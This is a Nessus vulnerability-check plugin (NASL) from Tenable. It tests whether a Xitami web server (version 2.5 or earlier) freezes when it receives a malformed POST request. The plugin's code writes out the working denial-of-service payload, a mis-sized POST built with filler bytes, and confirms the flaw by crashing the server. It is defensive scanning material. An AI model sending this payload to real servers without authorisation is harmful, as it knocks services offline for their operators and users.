#
# (C) Tenable Network Security, Inc.
# 


include("compat.inc");

if(description)
{
 script_id(11934);
 script_version ("$Revision: 1.19 $");
 script_bugtraq_id(9083);
 script_osvdb_id(2853);
 script_xref(name:"Secunia", value:"10275");
 
 script_name(english:"Xitami Malformed POST Request Infinite Loop Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web server with a denial of
service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a vulnerable version of the Xitami web
server.  It is possible to freeze the remote web server by sending
a malformed POST request. This is known to affect Xitami versions 2.5
and earlier." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2003/Nov/840");
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of the software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/12/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/11/21");
 script_cvs_date("$Date: 2016/11/01 19:59:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Xitami malformed header POST request denial of service");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);


if(! can_host_php(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

req = 	'POST /forum/index.php HTTP/1.1\r\nAccept-Encoding: None\r\n' +
	'Content-Length: 10\n\n' +
	crap(512) + '\r\n' + 
	crap(512);

r = http_send_recv_buf(port: port, data: req);

if (http_is_dead(port: port, retry: 2)) security_hole(port);
